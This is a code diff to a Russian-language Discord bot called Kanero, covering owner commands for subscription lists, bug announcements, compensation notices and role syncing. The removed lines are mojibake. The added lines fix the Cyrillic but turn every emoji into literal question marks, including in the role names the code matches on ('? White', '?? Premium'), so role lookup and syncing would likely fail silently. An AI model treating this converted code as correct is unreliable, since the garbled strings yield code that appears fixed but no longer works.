@@ -1536,15 +1536,15 @@ async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
             if ac:
                 await ac.send(
                     embed=discord.Embed(
-                        title="рџ—‘пёЏ Р’СЂРµРјСЏ РєРѕРјРїРµРЅСЃР°С†РёРё РёСЃС‚РµРєР»Рѕ",
+                        title="??? Время компенсации истекло",
                         description=(
-                            f"РљРѕРјРїРµРЅСЃР°С†РёСЏ **{sub_name}** Р·Р°РІРµСЂС€РµРЅР°.\n\n"
-                            f"РќРµ Р·Р°Р±СѓРґСЊ СѓРґР°Р»РёС‚СЊ СЃРѕРѕР±С‰РµРЅРёРµ РІ {comp_ch.mention}!"
+                            f"Компенсация **{sub_name}** завершена.\n\n"
+                            f"Не забудь удалить сообщение в {comp_ch.mention}!"
                         ),
                         color=0xff6b6b
-                    ).set_footer(text="в пёЏ Kanero")
+                    ).set_footer(text="?? Kanero")
                 )
-            # РџСЂРѕР±СѓРµРј СѓРґР°Р»РёС‚СЊ СЃРѕРѕР±С‰РµРЅРёРµ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё
+            # Пробуем удалить сообщение автоматически
             try:
                 await comp_msg.delete()
             except Exception:
@@ -1557,80 +1557,80 @@ async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
 
 @bot.command(name="announce_bug")
 async def announce_bug_cmd(ctx, *, message: str = None):
-    """РћР±СЉСЏРІРёС‚СЊ Рѕ Р±Р°РіРµ РІ РєР°РЅР°Р»Рµ РЅРѕРІРѕСЃС‚РµР№. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°.
-    РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: !announce_bug РќР°Р·РІР°РЅРёРµ | РћРїРёСЃР°РЅРёРµ С‡С‚Рѕ СЃР»СѓС‡РёР»РѕСЃСЊ Рё С‡С‚Рѕ РёСЃРїСЂР°РІР»РµРЅРѕ
+    """Объявить о баге в канале новостей. Только для овнера.
+    Использование: !announce_bug Название | Описание что случилось и что исправлено
     """
     if ctx.author.id != config.OWNER_ID:
         return
 
     if not message:
         await ctx.send(
-            "вќЊ **РќРµРІРµСЂРЅРѕРµ РёСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ.**\n"
-            "РџСЂР°РІРёР»СЊРЅРѕ: `!announce_bug РќР°Р·РІР°РЅРёРµ | РћРїРёСЃР°РЅРёРµ`\n\n"
-            "**РџСЂРёРјРµСЂ:** `!announce_bug РђРІС‚РѕРєСЂР°С€ СЃРµСЂРІРµСЂР° | Р‘РѕС‚ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё РєСЂР°С€РёР» РЅР°С€ СЃРµСЂРІРµСЂ РїСЂРё РїРµСЂРµР·Р°РїСѓСЃРєРµ. Р‘Р°Рі РёСЃРїСЂР°РІР»РµРЅ РІ v2.3.`"
+            "? **Неверное использование.**\n"
+            "Правильно: `!announce_bug Название | Описание`\n\n"
+            "**Пример:** `!announce_bug Автокраш сервера | Бот автоматически крашил наш сервер при перезапуске. Баг исправлен в v2.3.`"
         )
         return
 
-    # Р Р°Р·РґРµР»СЏРµРј РЅР° РЅР°Р·РІР°РЅРёРµ Рё РѕРїРёСЃР°РЅРёРµ
+    # Разделяем на название и описание
     if "|" in message:
         parts = message.split("|", 1)
         bug_title = parts[0].strip()
         bug_description = parts[1].strip()
     else:
-        bug_title = "РСЃРїСЂР°РІР»РµРЅ Р±Р°Рі"
+        bug_title = "Исправлен баг"
         bug_description = message.strip()
 
-    # РС‰РµРј РєР°РЅР°Р» РЅРѕРІРѕСЃС‚РµР№ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ
+    # Ищем канал новостей на домашнем сервере
     home_guild = bot.get_guild(HOME_GUILD_ID)
     if not home_guild:
-        await ctx.send("вќЊ Р”РѕРјР°С€РЅРёР№ СЃРµСЂРІРµСЂ РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send("? Домашний сервер не найден.")
         return
 
     news_channel = discord.utils.find(
-        lambda c: "РЅРѕРІРѕСЃС‚" in c.name.lower() or "news" in c.name.lower(),
+        lambda c: "новост" in c.name.lower() or "news" in c.name.lower(),
         home_guild.text_channels
     )
     if not news_channel:
-        await ctx.send("вќЊ РљР°РЅР°Р» РЅРѕРІРѕСЃС‚РµР№ РЅРµ РЅР°Р№РґРµРЅ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ.")
+        await ctx.send("? Канал новостей не найден на домашнем сервере.")
         return
 
     embed = discord.Embed(
-        title=f"рџђ› РСЃРїСЂР°РІР»РµРЅ Р±Р°Рі: {bug_title}",
+        title=f"?? Исправлен баг: {bug_title}",
         description=bug_description,
         color=0xff6b6b,
         timestamp=datetime.utcnow()
     )
     embed.add_field(
-        name="вњ… РЎС‚Р°С‚СѓСЃ",
-        value="Р‘Р°Рі РїРѕР»РЅРѕСЃС‚СЊСЋ РёСЃРїСЂР°РІР»РµРЅ Рё РѕР±РЅРѕРІР»РµРЅРёРµ СѓР¶Рµ Р°РєС‚РёРІРЅРѕ.",
+        name="? Статус",
+        value="Баг полностью исправлен и обновление уже активно.",
         inline=False
     )
     embed.add_field(
-        name="рџ’° РљРѕРјРїРµРЅСЃР°С†РёСЏ",
+        name="?? Компенсация",
         value=(
-            "Р•СЃР»Рё РІР°СЃ Р·Р°С‚СЂРѕРЅСѓР» СЌС‚РѕС‚ Р±Р°Рі вЂ” РЅР°РїРёС€РёС‚Рµ РІ С‚РёРєРµС‚, РјС‹ РІС‹РґР°РґРёРј РєРѕРјРїРµРЅСЃР°С†РёСЋ.\n"
-            "Р—Р° РєСЂРёС‚РёС‡РµСЃРєРёРµ Р±Р°РіРё РєРѕРјРїРµРЅСЃР°С†РёСЏ РІС‹РґР°С‘С‚СЃСЏ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё РІСЃРµРј РїРѕСЃС‚СЂР°РґР°РІС€РёРј."
+            "Если вас затронул этот баг — напишите в тикет, мы выдадим компенсацию.\n"
+            "За критические баги компенсация выдаётся автоматически всем пострадавшим."
         ),
         inline=False
     )
-    embed.set_footer(text="в пёЏ Kanero  |  РЎРїР°СЃРёР±Рѕ Р·Р° С‚РµСЂРїРµРЅРёРµ!")
+    embed.set_footer(text="?? Kanero  |  Спасибо за терпение!")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
 
     try:
         await news_channel.send(content="@everyone", embed=embed)
-        # РџРёС€РµРј РїРѕРґС‚РІРµСЂР¶РґРµРЅРёРµ РІ admin-chat, Р° РЅРµ РІ РєР°РЅР°Р» РЅРѕРІРѕСЃС‚РµР№
+        # Пишем подтверждение в admin-chat, а не в канал новостей
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if home_guild:
             admin_ch = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), home_guild.text_channels)
             if admin_ch:
-                await admin_ch.send(f"вњ… РћР±СЉСЏРІР»РµРЅРёРµ Рѕ Р±Р°РіРµ РѕРїСѓР±Р»РёРєРѕРІР°РЅРѕ РІ {news_channel.mention}")
+                await admin_ch.send(f"? Объявление о баге опубликовано в {news_channel.mention}")
     except Exception as e:
-        await ctx.send(f"вќЊ РћС€РёР±РєР° РїСЂРё РїСѓР±Р»РёРєР°С†РёРё: {e}")
+        await ctx.send(f"? Ошибка при публикации: {e}")
 
 
 @bot.command(name="list")
 async def list_cmd(ctx):
-    # Р’Р»Р°РґРµР»РµС† СЃРµСЂРІРµСЂР° РР›Р OWNER_ID РёР· РєРѕРЅС„РёРіР°
+    # Владелец сервера ИЛИ OWNER_ID из конфига
     is_server_owner = ctx.guild and ctx.author.id == ctx.guild.owner_id
     is_bot_owner = ctx.author.id == config.OWNER_ID
     if not is_server_owner and not is_bot_owner:
@@ -1641,76 +1641,76 @@ async def list_cmd(ctx):
         for uid in ids:
             try:
                 user = await bot.fetch_user(uid)
-                name = f"`{uid}` вЂ” **{user}**"
+                name = f"`{uid}` — **{user}**"
             except Exception:
-                name = f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*"
+                name = f"`{uid}` — *не найден*"
             lines.append(name)
-        return "\n".join(lines) if lines else "*РїСѓСЃС‚Рѕ*"
+        return "\n".join(lines) if lines else "*пусто*"
 
-    embed = discord.Embed(title="рџ“‹ РЎРїРёСЃРєРё Kanero", color=0x0a0a0a)
+    embed = discord.Embed(title="?? Списки Kanero", color=0x0a0a0a)
     protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
     now = datetime.utcnow()
 
-    # РЎРѕР±РёСЂР°РµРј ID РёР· РІСЂРµРјРµРЅРЅС‹С… РїРѕРґРїРёСЃРѕРє (С‚РѕР»СЊРєРѕ Р°РєС‚РёРІРЅС‹Рµ)
+    # Собираем ID из временных подписок (только активные)
     temp_wl = {uid for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "wl" and now < s["expires"]}
     temp_pm = {uid for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "pm" and now < s["expires"]}
     temp_fl = {uid for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "fl" and now < s["expires"]}
 
-    # Р’СЂРµРјРµРЅРЅС‹Рµ РїРѕРґРїРёСЃРєРё вЂ” РїРѕРєР°Р·С‹РІР°РµРј РџР•Р Р’Р«РњР РµСЃР»Рё РµСЃС‚СЊ Р°РєС‚РёРІРЅС‹Рµ
+    # Временные подписки — показываем ПЕРВЫМИ если есть активные
     temp_lines = []
     for uid, sub in list(TEMP_SUBSCRIPTIONS.items()):
         if now > sub["expires"]:
             continue
-        sub_names = {"wl": "вњ… White", "pm": "рџ’Ћ Premium", "fl": "рџ“‹ Freelist"}
+        sub_names = {"wl": "? White", "pm": "?? Premium", "fl": "?? Freelist"}
         sub_name = sub_names.get(sub["type"], sub["type"])
         expires_ts = int(sub["expires"].timestamp())
         try:
             user = await bot.fetch_user(uid)
-            temp_lines.append(f"`{uid}` вЂ” **{user}** | {sub_name} | <t:{expires_ts}:R>")
+            temp_lines.append(f"`{uid}` — **{user}** | {sub_name} | <t:{expires_ts}:R>")
         except Exception:
             temp_lines.append(f"`{uid}` | {sub_name} | <t:{expires_ts}:R>")
     if temp_lines:
         value = "\n".join(temp_lines)
         if len(value) > 1020:
             value = value[:1020] + "..."
-        embed.add_field(name=f"вЏі Р’СЂРµРјРµРЅРЅС‹Рµ РїРѕРґРїРёСЃРєРё ({len(temp_lines)})", value=value, inline=False)
+        embed.add_field(name=f"? Временные подписки ({len(temp_lines)})", value=value, inline=False)
 
-    # Freelist вЂ” РўРћР›Р¬РљРћ РїРѕСЃС‚РѕСЏРЅРЅС‹Рµ (Р±РµР· РІСЂРµРјРµРЅРЅС‹С…)
+    # Freelist — ТОЛЬКО постоянные (без временных)
     fl_only = [uid for uid in FREELIST if uid not in config.WHITELIST and uid not in PREMIUM_LIST and uid not in temp_fl]
     
-    # Whitelist вЂ” РўРћР›Р¬РљРћ РїРѕСЃС‚РѕСЏРЅРЅС‹Рµ (Р±РµР· РІСЂРµРјРµРЅРЅС‹С…)
+    # Whitelist — ТОЛЬКО постоянные (без временных)
     wl_only = [uid for uid in config.WHITELIST if uid not in PREMIUM_LIST and uid not in protected and uid not in temp_wl]
     
-    # Premium вЂ” РўРћР›Р¬РљРћ РїРѕСЃС‚РѕСЏРЅРЅС‹Рµ (Р±РµР· РІСЂРµРјРµРЅРЅС‹С…)
+    # Premium — ТОЛЬКО постоянные (без временных)
     pm_all = [uid for uid in PREMIUM_LIST if uid not in temp_pm]
     
-    embed.add_field(name=f"рџ“‹ Freelist ({len(fl_only)})",                        value=await fmt(fl_only),              inline=False)
-    embed.add_field(name=f"вњ… Whitelist ({len(wl_only)})",                        value=await fmt(wl_only),              inline=False)
-    embed.add_field(name=f"рџ’Ћ Premium ({len(pm_all)})",                           value=await fmt(pm_all),               inline=False)
-    embed.add_field(name=f"рџ‘‘ Owner (1)",                                         value=f"`{config.OWNER_ID}` вЂ” **Owner**", inline=False)
+    embed.add_field(name=f"?? Freelist ({len(fl_only)})",                        value=await fmt(fl_only),              inline=False)
+    embed.add_field(name=f"? Whitelist ({len(wl_only)})",                        value=await fmt(wl_only),              inline=False)
+    embed.add_field(name=f"?? Premium ({len(pm_all)})",                           value=await fmt(pm_all),               inline=False)
+    embed.add_field(name=f"?? Owner (1)",                                         value=f"`{config.OWNER_ID}` — **Owner**", inline=False)
 
     embed.add_field(
-        name="рџ“Њ РЈРїСЂР°РІР»РµРЅРёРµ",
+        name="?? Управление",
         value=(
-            "`!fl_add/remove/clear` вЂ” freelist\n"
-            "`!wl_add/remove` вЂ” whitelist\n"
-            "`!pm_add/remove` вЂ” premium\n"
-            "`!list_remove` вЂ” РѕС‡РёСЃС‚РёС‚СЊ РІСЃРµ СЃРїРёСЃРєРё"
+            "`!fl_add/remove/clear` — freelist\n"
+            "`!wl_add/remove` — whitelist\n"
+            "`!pm_add/remove` — premium\n"
+            "`!list_remove` — очистить все списки"
         ),
         inline=False
     )
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await ctx.send(embed=embed)
 
 
 @bot.command(name="list_remove")
 async def list_remove_cmd(ctx):
-    """РџРѕР»РЅРѕСЃС‚СЊСЋ РѕС‡РёС‰Р°РµС‚ РІСЃРµ СЃРїРёСЃРєРё (freelist, whitelist, premium). РўРѕР»СЊРєРѕ РґР»СЏ Owner."""
+    """Полностью очищает все списки (freelist, whitelist, premium). Только для Owner."""
     if ctx.author.id != config.OWNER_ID:
-        await ctx.send("вќЊ РўРѕР»СЊРєРѕ РґР»СЏ Owner.")
+        await ctx.send("? Только для Owner.")
         return
     
-    # РџРѕРґСЃС‡РёС‚С‹РІР°РµРј СЃРєРѕР»СЊРєРѕ Р±СѓРґРµС‚ СѓРґР°Р»РµРЅРѕ
+    # Подсчитываем сколько будет удалено
     fl_count = len(FREELIST)
     wl_count = len(config.WHITELIST)
     pm_count = len(PREMIUM_LIST)
@@ -1718,76 +1718,76 @@ async def list_remove_cmd(ctx):
     total = fl_count + wl_count + pm_count + temp_count
     
     if total == 0:
-        await ctx.send("в„№пёЏ Р’СЃРµ СЃРїРёСЃРєРё СѓР¶Рµ РїСѓСЃС‚С‹.")
+        await ctx.send("?? Все списки уже пусты.")
         return
     
-    # РћС‡РёС‰Р°РµРј РІСЃРµ СЃРїРёСЃРєРё
+    # Очищаем все списки
     FREELIST.clear()
     config.WHITELIST.clear()
     PREMIUM_LIST.clear()
     TEMP_SUBSCRIPTIONS.clear()
     
-    # РЎРѕС…СЂР°РЅСЏРµРј РёР·РјРµРЅРµРЅРёСЏ
+    # Сохраняем изменения
     save_freelist()
     save_whitelist()
     save_premium_list()
     save_temp_subscriptions()
     
     embed = discord.Embed(
-        title="рџ—‘пёЏ РЎРїРёСЃРєРё РѕС‡РёС‰РµРЅС‹",
+        title="??? Списки очищены",
         description=(
-            f"**РЈРґР°Р»РµРЅРѕ СѓС‡Р°СЃС‚РЅРёРєРѕРІ:**\n"
-            f"рџ“‹ Freelist: {fl_count}\n"
-            f"вњ… Whitelist: {wl_count}\n"
-            f"рџ’Ћ Premium: {pm_count}\n"
-            f"вЏі Р’СЂРµРјРµРЅРЅС‹Рµ: {temp_count}\n\n"
-            f"**Р’СЃРµРіРѕ СѓРґР°Р»РµРЅРѕ: {total}**"
+            f"**Удалено участников:**\n"
+            f"?? Freelist: {fl_count}\n"
+            f"? Whitelist: {wl_count}\n"
+            f"?? Premium: {pm_count}\n"
+            f"? Временные: {temp_count}\n\n"
+            f"**Всего удалено: {total}**"
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero  |  Р’СЃРµ СЃРїРёСЃРєРё РѕС‡РёС‰РµРЅС‹")
+    embed.set_footer(text="?? Kanero  |  Все списки очищены")
     await ctx.send(embed=embed)
 
 
 @bot.command(name="sync_roles")
 async def sync_roles_cmd(ctx):
-    """РџСЂРѕРІРµСЂСЏРµС‚ Рё СЃРёРЅС…СЂРѕРЅРёР·РёСЂСѓРµС‚ СЂРѕР»Рё РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ Р»РёСЃС‚РѕРІ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ."""
+    """Проверяет и синхронизирует роли всех участников листов на домашнем сервере."""
     if ctx.author.id != config.OWNER_ID:
         return
 
     guild = bot.get_guild(HOME_GUILD_ID)
     if not guild:
-        await ctx.send("вќЊ Р”РѕРјР°С€РЅРёР№ СЃРµСЂРІРµСЂ РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send("? Домашний сервер не найден.")
         return
 
-    msg = await ctx.send("рџ”„ РЎРёРЅС…СЂРѕРЅРёР·РёСЂСѓСЋ СЂРѕР»Рё...")
+    msg = await ctx.send("?? Синхронизирую роли...")
 
-    role_white   = discord.utils.find(lambda r: r.name == "вњ… White",   guild.roles)
-    role_premium = discord.utils.find(lambda r: r.name == "рџ’Ћ Premium", guild.roles)
-    role_user    = discord.utils.find(lambda r: r.name == "рџ‘Ґ User",    guild.roles)
-    role_guest   = discord.utils.find(lambda r: r.name == "рџ‘¤ Guest",   guild.roles)
+    role_white   = discord.utils.find(lambda r: r.name == "? White",   guild.roles)
+    role_premium = discord.utils.find(lambda r: r.name == "?? Premium", guild.roles)
+    role_user    = discord.utils.find(lambda r: r.name == "?? User",    guild.roles)
+    role_guest   = discord.utils.find(lambda r: r.name == "?? Guest",   guild.roles)
 
     given = []
     removed = []
     missing = []
 
-    # Р—Р°РіСЂСѓР¶Р°РµРј РІСЃРµС… СѓС‡Р°СЃС‚РЅРёРєРѕРІ СЃРµСЂРІРµСЂР° (РЅР° СЃР»СѓС‡Р°Р№ РµСЃР»Рё РєСЌС€ РЅРµРїРѕР»РЅС‹Р№)
+    # Загружаем всех участников сервера (на случай если кэш неполный)
     if not guild.chunked:
         await guild.chunk()
 
-    # Р’С‹РґР°С‘Рј Guest РІСЃРµРј СѓС‡Р°СЃС‚РЅРёРєР°Рј Сѓ РєРѕРіРѕ РµС‘ РЅРµС‚
+    # Выдаём Guest всем участникам у кого её нет
     if role_guest:
         for member in guild.members:
             if member.bot:
                 continue
             if role_guest not in member.roles:
                 try:
-                    await member.add_roles(role_guest, reason="sync_roles: Р°РІС‚Рѕ Guest")
-                    given.append(f"рџ‘¤ {member} в†’ Guest")
+                    await member.add_roles(role_guest, reason="sync_roles: авто Guest")
+                    given.append(f"?? {member} > Guest")
                 except Exception:
                     pass
 
-    # РЎРѕР±РёСЂР°РµРј РІСЃРµС… РєС‚Рѕ РґРѕР»Р¶РµРЅ Р±С‹С‚СЊ РІ РєР°РєРѕРј Р»РёСЃС‚Рµ
+    # Собираем всех кто должен быть в каком листе
     wl_ids  = set(config.WHITELIST)
     pm_ids  = set(PREMIUM_LIST)
     fl_ids  = set(FREELIST)
@@ -1798,22 +1798,22 @@ async def sync_roles_cmd(ctx):
             try:
                 member = await guild.fetch_member(uid)
             except Exception:
-                # РќРµС‚ РЅР° СЃРµСЂРІРµСЂРµ вЂ” СЃРЅРёРјР°РµРј РёР· Р»РёСЃС‚РѕРІ
+                # Нет на сервере — снимаем из листов
                 kicked_from = []
                 if uid in config.WHITELIST:
                     config.WHITELIST.remove(uid)
                     save_whitelist()
-                    kicked_from.append("вњ… White")
+                    kicked_from.append("? White")
                 if uid in PREMIUM_LIST:
                     PREMIUM_LIST.remove(uid)
                     save_premium()
-                    kicked_from.append("рџ’Ћ Premium")
+                    kicked_from.append("?? Premium")
                 if uid in FREELIST:
                     FREELIST.remove(uid)
                     save_freelist()
-                    kicked_from.append("рџ“‹ Freelist")
+                    kicked_from.append("?? Freelist")
                 if kicked_from:
-                    missing.append(f"`{uid}` вЂ” СѓР±СЂР°РЅ РёР·: {', '.join(kicked_from)}")
+                    missing.append(f"`{uid}` — убран из: {', '.join(kicked_from)}")
                 else:
                     missing.append(f"`{uid}`")
                 continue
@@ -1823,15 +1823,15 @@ async def sync_roles_cmd(ctx):
             if role_premium and role_premium not in member.roles:
                 try:
                     await member.add_roles(role_premium, reason="sync_roles")
-                    given.append(f"рџ’Ћ {member} в†’ Premium")
+                    given.append(f"?? {member} > Premium")
                 except Exception:
                     pass
-        # Whitelist (РЅРµ premium)
+        # Whitelist (не premium)
         elif uid in wl_ids:
             if role_white and role_white not in member.roles:
                 try:
                     await member.add_roles(role_white, reason="sync_roles")
-                    given.append(f"вњ… {member} в†’ White")
+                    given.append(f"? {member} > White")
                 except Exception:
                     pass
         # Freelist
@@ -1839,194 +1839,194 @@ async def sync_roles_cmd(ctx):
             if role_user and role_user not in member.roles:
                 try:
                     await member.add_roles(role_user, reason="sync_roles")
-                    given.append(f"рџ‘Ґ {member} в†’ User")
+                    given.append(f"?? {member} > User")
                 except Exception:
                     pass
 
-    # РџСЂРѕРІРµСЂСЏРµРј СѓС‡Р°СЃС‚РЅРёРєРѕРІ СЃРµСЂРІРµСЂР° вЂ” СЃРЅРёРјР°РµРј СЂРѕР»Рё РµСЃР»Рё РёС… РЅРµС‚ РІ Р»РёСЃС‚Р°С…
+    # Проверяем участников сервера — снимаем роли если их нет в листах
     for member in guild.members:
         if member.bot:
             continue
         uid = member.id
         if role_premium and role_premium in member.roles and uid not in pm_ids and uid != config.OWNER_ID:
             try:
-                await member.remove_roles(role_premium, reason="sync_roles: РЅРµ РІ premium Р»РёСЃС‚Рµ")
-                removed.append(f"рџ’Ћ {member} в†ђ СѓР±СЂР°РЅР° Premium")
+                await member.remove_roles(role_premium, reason="sync_roles: не в premium листе")
+                removed.append(f"?? {member} < убрана Premium")
             except Exception:
                 pass
         if role_white and role_white in member.roles and uid not in wl_ids and uid not in pm_ids and uid != config.OWNER_ID:
             try:
-                await member.remove_roles(role_white, reason="sync_roles: РЅРµ РІ whitelist")
-                removed.append(f"вњ… {member} в†ђ СѓР±СЂР°РЅР° White")
+                await member.remove_roles(role_white, reason="sync_roles: не в whitelist")
+                removed.append(f"? {member} < убрана White")
             except Exception:
                 pass
 
     lines = []
     if given:
-        lines.append("**Р’С‹РґР°РЅРѕ:**\n" + "\n".join(given))
+        lines.append("**Выдано:**\n" + "\n".join(given))
     if removed:
-        lines.append("**РЎРЅСЏС‚Рѕ:**\n" + "\n".join(removed))
+        lines.append("**Снято:**\n" + "\n".join(removed))
     if missing:
-        lines.append(f"**РќРµ РЅР° СЃРµСЂРІРµСЂРµ вЂ” СѓРґР°Р»РµРЅС‹ РёР· Р»РёСЃС‚РѕРІ ({len(missing)}):**\n" + "\n".join(missing))
+        lines.append(f"**Не на сервере — удалены из листов ({len(missing)}):**\n" + "\n".join(missing))
     if not given and not removed and not missing:
-        lines.append("вњ… Р’СЃРµ СЂРѕР»Рё РІ РїРѕСЂСЏРґРєРµ, РЅРёС‡РµРіРѕ РЅРµ РёР·РјРµРЅРµРЅРѕ.")
+        lines.append("? Все роли в порядке, ничего не изменено.")
 
     embed = discord.Embed(
-        title="рџ”„ РЎРёРЅС…СЂРѕРЅРёР·Р°С†РёСЏ СЂРѕР»РµР№",
+        title="?? Синхронизация ролей",
         description="\n\n".join(lines),
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero  |  !list вЂ” РїРѕСЃРјРѕС‚СЂРµС‚СЊ Р»РёСЃС‚С‹")
+    embed.set_footer(text="?? Kanero  |  !list — посмотреть листы")
     await msg.edit(content=None, embed=embed)
 
 
 @bot.command(name="temp_check")
 async def temp_check(ctx):
-    """РџСЂРѕРІРµСЂРёС‚СЊ РІСЂРµРјРµРЅРЅС‹Рµ РїРѕРґРїРёСЃРєРё. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°."""
+    """Проверить временные подписки. Только для овнера."""
     if ctx.author.id != config.OWNER_ID:
         return
     
     now = datetime.utcnow()
-    embed = discord.Embed(title="вЏі Р’СЂРµРјРµРЅРЅС‹Рµ РїРѕРґРїРёСЃРєРё", color=0x0a0a0a)
+    embed = discord.Embed(title="? Временные подписки", color=0x0a0a0a)
     
     if not TEMP_SUBSCRIPTIONS:
-        embed.description = "вќЊ РќРµС‚ Р°РєС‚РёРІРЅС‹С… РІСЂРµРјРµРЅРЅС‹С… РїРѕРґРїРёСЃРѕРє"
+        embed.description = "? Нет активных временных подписок"
     else:
         lines = []
-        # РЎРѕР·РґР°РµРј РєРѕРїРёСЋ СЃР»РѕРІР°СЂСЏ С‡С‚РѕР±С‹ РёР·Р±РµР¶Р°С‚СЊ РѕС€РёР±РєРё РёР·РјРµРЅРµРЅРёСЏ СЂР°Р·РјРµСЂР° РІРѕ РІСЂРµРјСЏ РёС‚РµСЂР°С†РёРё
+        # Создаем копию словаря чтобы избежать ошибки изменения размера во время итерации
         temp_copy = dict(TEMP_SUBSCRIPTIONS)
         
         for uid, sub in temp_copy.items():
             expires_ts = int(sub["expires"].timestamp())
-            status = "вњ… РђРєС‚РёРІРЅР°" if now < sub["expires"] else "вќЊ РСЃС‚РµРєР»Р°"
-            sub_names = {"wl": "вњ… White", "pm": "рџ’Ћ Premium", "fl": "рџ“‹ Freelist"}
+            status = "? Активна" if now < sub["expires"] else "? Истекла"
+            sub_names = {"wl": "? White", "pm": "?? Premium", "fl": "?? Freelist"}
             sub_name = sub_names.get(sub["type"], sub["type"])
             
             try:
                 user = await bot.fetch_user(uid)
-                lines.append(f"`{uid}` вЂ” **{user}**\n{sub_name} | <t:{expires_ts}:R> | {status}")
+                lines.append(f"`{uid}` — **{user}**\n{sub_name} | <t:{expires_ts}:R> | {status}")
             except Exception:
-                lines.append(f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*\n{sub_name} | <t:{expires_ts}:R> | {status}")
+                lines.append(f"`{uid}` — *не найден*\n{sub_name} | <t:{expires_ts}:R> | {status}")
         
-        embed.description = "\n\n".join(lines) if lines else "вќЊ РќРµС‚ РІСЂРµРјРµРЅРЅС‹С… РїРѕРґРїРёСЃРѕРє"
+        embed.description = "\n\n".join(lines) if lines else "? Нет временных подписок"
     
-    embed.set_footer(text=f"в пёЏ Kanero  |  Р’СЃРµРіРѕ: {len(TEMP_SUBSCRIPTIONS)}")
+    embed.set_footer(text=f"?? Kanero  |  Всего: {len(TEMP_SUBSCRIPTIONS)}")
     await ctx.send(embed=embed)
 
 
 @bot.command(name="fix_role")
 async def fix_role_cmd(ctx, user: discord.Member = None):
-    """РџСЂРѕРІРµСЂСЏРµС‚ Рё РІС‹РґР°РµС‚ СЂРѕР»СЊ РєРѕРЅРєСЂРµС‚РЅРѕРјСѓ РїРѕР»СЊР·РѕРІР°С‚РµР»СЋ, РµСЃР»Рё РѕРЅ РµСЃС‚СЊ РІ СЃРїРёСЃРєР°С…."""
-    # РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ РёР»Рё РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ
+    """Проверяет и выдает роль конкретному пользователю, если он есть в списках."""
+    # Только овнер или на домашнем сервере
     if ctx.author.id != config.OWNER_ID and ctx.guild.id != HOME_GUILD_ID:
         return
     
-    # Р•СЃР»Рё РїРѕР»СЊР·РѕРІР°С‚РµР»СЊ РЅРµ СѓРєР°Р·Р°РЅ, РїСЂРѕРІРµСЂСЏРµРј Р°РІС‚РѕСЂР° РєРѕРјР°РЅРґС‹
+    # Если пользователь не указан, проверяем автора команды
     if user is None:
         user = ctx.author
     
     guild = ctx.guild
     if guild.id != HOME_GUILD_ID:
-        await ctx.send("вќЊ РљРѕРјР°РЅРґР° СЂР°Р±РѕС‚Р°РµС‚ С‚РѕР»СЊРєРѕ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ.")
+        await ctx.send("? Команда работает только на домашнем сервере.")
         return
 
-    # РќР°С…РѕРґРёРј СЂРѕР»Рё
-    role_white   = discord.utils.find(lambda r: r.name == "вњ… White",   guild.roles)
-    role_premium = discord.utils.find(lambda r: r.name == "рџ’Ћ Premium", guild.roles)
-    role_user    = discord.utils.find(lambda r: r.name == "рџ‘Ґ User",    guild.roles)
-    role_guest   = discord.utils.find(lambda r: r.name == "рџ‘¤ Guest",   guild.roles)
+    # Находим роли
+    role_white   = discord.utils.find(lambda r: r.name == "? White",   guild.roles)
+    role_premium = discord.utils.find(lambda r: r.name == "?? Premium", guild.roles)
+    role_user    = discord.utils.find(lambda r: r.name == "?? User",    guild.roles)
+    role_guest   = discord.utils.find(lambda r: r.name == "?? Guest",   guild.roles)
 
     uid = user.id
     changes = []
     
-    # РџСЂРѕРІРµСЂСЏРµРј РІ РєР°РєРёС… СЃРїРёСЃРєР°С… РїРѕР»СЊР·РѕРІР°С‚РµР»СЊ
+    # Проверяем в каких списках пользователь
     in_premium = uid in PREMIUM_LIST
     in_whitelist = uid in config.WHITELIST
     in_freelist = uid in FREELIST
     
-    # Р’С‹РґР°РµРј Guest РµСЃР»Рё РµРіРѕ РЅРµС‚
+    # Выдаем Guest если его нет
     if role_guest and role_guest not in user.roles:
         try:
-            await user.add_roles(role_guest, reason="fix_role: Р°РІС‚Рѕ Guest")
-            changes.append("рџ‘¤ Guest вЂ” РІС‹РґР°РЅР°")
+            await user.add_roles(role_guest, reason="fix_role: авто Guest")
+            changes.append("?? Guest — выдана")
         except Exception as e:
-            changes.append(f"рџ‘¤ Guest вЂ” РѕС€РёР±РєР°: {e}")
+            changes.append(f"?? Guest — ошибка: {e}")
     
-    # РџСЂРѕРІРµСЂСЏРµРј Рё РІС‹РґР°РµРј РѕСЃРЅРѕРІРЅСѓСЋ СЂРѕР»СЊ
+    # Проверяем и выдаем основную роль
     if in_premium:
         if role_premium and role_premium not in user.roles:
             try:
